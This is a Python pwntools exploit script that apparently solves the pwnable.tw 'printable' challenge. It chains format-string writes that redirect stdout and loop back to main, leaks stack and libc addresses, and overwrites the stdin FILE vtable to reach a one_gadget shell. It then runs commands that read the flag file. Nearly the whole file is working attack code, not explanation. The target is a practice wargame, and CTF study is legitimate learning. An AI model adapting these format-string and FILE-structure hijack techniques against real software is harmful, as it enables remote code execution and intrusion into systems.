#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 10307
HOST = "chall.pwnable.tw"
exe = context.binary = ELF('./printable_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.23.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            b* 0x0000000000400939
            b* 0x000000000040094D
            b* 0x400957
            b* exit+16
            b* deregister_tm_clones
            # b* vfprintf+817
            b* __run_exit_handlers+230
            b* _IO_flush_all_lockp+371
            c
            set follow-fork-mode parent
            ''')

def conn():
    if len(sys.argv) > 1 and sys.argv[1] == 'r':
        return remote(HOST, PORT)
    else:
        return exe.process()


# VARIABLE
main = exe.sym.main
log.info("main: " + hex(main))
stderr = libc.sym._IO_2_1_stderr_
log.info("stderr: " + hex(stderr))

# PAYLOAD
attempt = 1
while True:
    log.info("Attempt: " + str(attempt))
    attempt += 1
    p = conn()

    try:
        # Part 1: ret2main + Overwrite stdout -> _IO_2_1_stderr_
        package = {
            (main + 86) & 0xff:        0x601050,
            (main + 86) >> 8 & 0xff:   0x601051,
            (main + 86) >> 16 & 0xff:  0x601052,
        }
        order = sorted(package)
        payload  = f'%{order[0]}c%15$hhn'.encode()
        payload += f'%{order[1] - order[0]}c%16$hhn'.encode()
        payload += f'%{order[2] - order[1]}c%17$hhn'.encode()

        package1 = {
            stderr & 0xff:      0x601020,
            stderr >> 8 & 0xff: 0x601021,
        }
        order1 = sorted(package1)
        payload += f'%{order1[0] + 0x71 + 0x4f}c%18$hhn'.encode()
        payload += f'%{order1[1] - order1[0]}c%19$hhn'.encode()
        payload += f'%{0x298 - 0xcf - 0x76}c%42$hn'.encode()
        payload = payload.ljust(0x48, b'a')
        payload += flat(
            package[order[0]],
            package[order[1]],
            package[order[2]],
        )
        payload += flat(
            package1[order1[0]],
            package1[order1[1]],
        )
        p.sendafter(b'Input :', payload)

        # Part 2:
        sleep(0.5)
        payload = f'%{main & 0xffff}c%23$hn'.encode()
        payload += b'|%11$p|%28$p|' # leak
        payload = payload.ljust(0x20, b'\0')
        p.send(payload)
        leak = p.recvuntil(b'Input')
        leak = leak.split(b'|')
        print(leak)
        stack_leak = int(leak[1], 16)
        log.info("Stack leak: " + hex(stack_leak))
        libc_leak = int(leak[2], 16)
        libc.address = libc_leak - libc.sym.initial
        log.info("Libc base: " + hex(libc.address))
        system = libc.sym.system
        bin_sh_ptr = next(libc.search(b'/bin/sh'))
        pop_rdi = 0x0000000000021102 + libc.address
        ret = pop_rdi + 1
        io_wfile_jumps = libc.sym._IO_wfile_jumps
        stderr = libc.sym._IO_2_1_stderr_
        stdout = libc.sym._IO_2_1_stdout_
        stdin = libc.sym._IO_2_1_stdin_
        gadget = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
        break
    except EOFError:
        p.close()

# Part 3: Get shell
# fp->vtable = [stack] -> one_gadget
package = {
    (stack_leak - 0x218 + 0x48 - 0x18) & 0xffff:         stdin + 0xd8,
    (stack_leak - 0x218 + 0x48 - 0x18) >> 16 & 0xffff:   stdin + 0xd8 + 2,
    (stack_leak - 0x218 + 0x48 - 0x18) >> 32 & 0xffff:   stdin + 0xd8 + 4,
}
order = sorted(package)
payload  = f'%{order[0]}c%16$hn'.encode()
payload += f'%{order[1] - order[0]}c%17$hn'.encode()
payload += f'%{order[2] - order[1]}c%18$hn'.encode()

# fp->_IO_write_ptr > fp->_IO_write_base
package1 = {
(stdin + 132) & 0xffff: stdin + 0x28,
}
order1 = sorted(package1)
payload += f'%{order1[0] - (order[2] - order[1])}c%19$hn'.encode()
payload = payload.ljust(0x50, b'a')
payload += flat(
    package[order[0]],
    package[order[1]],
    package[order[2]],
)
payload += flat(
    package1[order1[0]],
)
payload += p64(gadget[2] + libc.address)
# input(b'Press ENTER to continue')
sleep(0.5)
# GDB()
p.sendafter(b':', payload)

sleep(0.5)
p.sendline(b'ls 1>&2')
p.sendline(b'cat /home/printable/printable_fl4g 1>&2')
p.sendline(b'id 1>&2')

p.interactive()

# offset bp: 0x410b94
# offset ptr: 0x62747c

# saved rip of printf: 0x7ffeae9e72b0
# ptr stack: 0x7ffeae9e7478